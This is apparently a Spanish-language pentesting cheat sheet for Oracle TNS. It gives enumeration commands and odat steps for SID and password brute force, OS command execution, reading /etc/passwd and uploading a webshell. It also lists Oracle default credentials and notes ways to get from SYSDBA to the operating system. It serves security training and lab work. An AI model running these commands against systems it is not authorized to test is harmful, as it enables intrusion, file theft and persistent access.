# Oracle TNS — Transparent Network Substrate

Oracle TNS es el protocolo de comunicación de Oracle Database. Opera en el puerto **1521** (TCP) por defecto. Oracle tiene una arquitectura más compleja que MySQL o MSSQL, con su propio sistema de naming, listeners y SIDs/Service Names que identifican cada instancia de base de datos.

### Conceptos clave

| Concepto                    | Descripción                                                                                        |
| --------------------------- | -------------------------------------------------------------------------------------------------- |
| **TNS Listener**            | Proceso que escucha en el puerto 1521 y acepta conexiones entrantes hacia las instancias de Oracle |
| **SID** (System Identifier) | Nombre único que identifica una instancia de Oracle en el servidor                                 |
| **Service Name**            | Nombre alternativo de una base de datos, puede diferir del SID                                     |
| **tnsnames.ora**            | Archivo de configuración del cliente con los destinos de conexión                                  |
| **sqlnet.ora**              | Archivo de configuración de seguridad del cliente/servidor                                         |

### Enumeración

#### Nmap

```bash
# Detección básica
nmap -sV -p 1521 target
nmap -sC -sV -p 1521 target

# Scripts específicos para Oracle
nmap --script oracle-sid-brute -p 1521 target          # brute force de SIDs
nmap --script oracle-tns-version -p 1521 target        # versión del TNS listener
nmap --script oracle-enum-users --script-args oracle-enum-users.sid=XE -p 1521 target
```

#### tnscmd10g — consultar el listener

`tnscmd10g` es una herramienta para interactuar directamente con el TNS Listener y extraer información:

```bash
# Obtener versión y estado del listener
tnscmd10g version -h target
tnscmd10g status -h target

# Información del listener con puerto específico
tnscmd10g version -p 1521 -h target
```

#### odat — Oracle Database Attacking Tool

`odat` es la herramienta más completa para el pentesting de Oracle. Combina enumeración, brute force y explotación:

```bash
# Instalación
pip3 install odat

# Descubrir SIDs del servidor
odat sidguesser -s target -p 1521

# Brute force de SIDs con wordlist
odat sidguesser -s target -p 1521 --sids-file /usr/share/seclists/Passwords/oracle-sids.txt

# Brute force de credenciales una vez conocido el SID
odat passwordguesser -s target -d XE -p 1521
odat passwordguesser -s target -d XE --accounts-file /usr/share/seclists/Passwords/Default-Credentials/oracle-default-passwords.csv

# Módulos de enumeración con credenciales válidas
odat all -s target -d XE -U usuario -P contraseña          # ejecutar todos los módulos
odat dbmsscheduler -s target -d XE -U usuario -P contraseña --sysdba  # con privilegios SYSDBA

# Ejecutar comandos del sistema
odat externaltable -s target -d XE -U usuario -P contraseña --exec /bin/ls /tmp
odat dbmsscheduler -s target -d XE -U usuario -P contraseña --exec "id"

# Leer archivos
odat ctxsys -s target -d XE -U usuario -P contraseña --getFile /etc/passwd / passwd

# Subir archivos (webshell)
odat utlfile -s target -d XE -U usuario -P contraseña --putFile /var/www/html shell.php /tmp/shell.php
```

#### sqlplus — cliente oficial de Oracle

```bash
# Instalación del cliente Oracle (sqlplus)
# Requiere descarga de Oracle Instant Client desde oracle.com

# Conectar a Oracle
sqlplus usuario/contraseña@target:1521/XE
sqlplus usuario/contraseña@target:1521/XE as sysdba

# Formato alternativo
sqlplus usuario/contraseña@//target:1521/XE
```

### Consultas SQL en Oracle

Oracle usa PL/SQL y tiene algunas diferencias de sintaxis respecto a MySQL/MSSQL:

```sql
-- Información del servidor
SELECT * FROM v$version;
SELECT banner FROM v$version WHERE banner LIKE 'Oracle%';

-- Usuario actual
SELECT USER FROM dual;
SELECT sys_context('USERENV', 'CURRENT_USER') FROM dual;

-- Bases de datos/schemas disponibles
SELECT name FROM v$database;
SELECT username FROM dba_users;           -- requiere privilegios DBA
SELECT username FROM all_users;           -- usuarios visibles para el actual

-- Tablas
SELECT table_name FROM user_tables;       -- tablas del usuario actual
SELECT table_name FROM all_tables;        -- todas las tablas accesibles
SELECT owner, table_name FROM dba_tables; -- todas las tablas (requiere DBA)

-- Privilegios del usuario actual
SELECT * FROM session_privs;
SELECT * FROM user_sys_privs;

-- Verificar si somos DBA
SELECT * FROM session_privs WHERE privilege = 'DBA';
```

### SIDs comunes

Al hacer brute force de SIDs, empezar con los más comunes:

* `XE` — Oracle Express Edition (el más frecuente en labs)
* `ORCL` — instalación por defecto en versiones antiguas
* `DB` — nombre genérico frecuente
* `PROD`, `DEV`, `TEST`, `STAGE` — entornos corporativos

### Riesgos y misconfiguraciones

| Riesgo                          | Descripción                                                                                                                       |
| ------------------------------- | --------------------------------------------------------------------------------------------------------------------------------- |
| **SID/Service Name predecible** | SIDs como `XE`, `ORCL` o el nombre de la empresa son fáciles de adivinar.                                                         |
| **Credenciales por defecto**    | `sys/change_on_install`, `system/manager`, `scott/tiger` son credenciales clásicas de Oracle.                                     |
| **Cuenta SYSDBA**               | Si se obtiene acceso como SYSDBA, se tiene control total sobre la base de datos y capacidad de ejecutar comandos del SO.          |
| **External Tables**             | Permiten leer archivos del sistema de archivos del servidor si el usuario tiene los privilegios necesarios.                       |
| **UTL\_FILE**                   | Paquete Oracle que permite leer y escribir archivos del sistema. Con permisos adecuados → leer `/etc/passwd`, escribir webshells. |
| **dbms\_scheduler**             | Permite crear y ejecutar jobs del sistema operativo desde PL/SQL → RCE si el usuario tiene privilegios.                           |
| **TNS Listener sin contraseña** | En versiones antiguas el listener podía administrarse sin autenticación.                                                          |

> Con credenciales de **SYSDBA** en Oracle, el acceso al sistema operativo es casi directo a través de `dbms_scheduler`, `utl_file`, `external tables` y otros paquetes que interactúan con el sistema de archivos y los procesos del servidor.

> Las **credenciales por defecto de Oracle** (`sys/change_on_install`, `system/manager`, `scott/tiger`) llevan décadas sin cambiar en muchas instalaciones. Siempre probarlas antes del brute force — ahorra mucho tiempo.
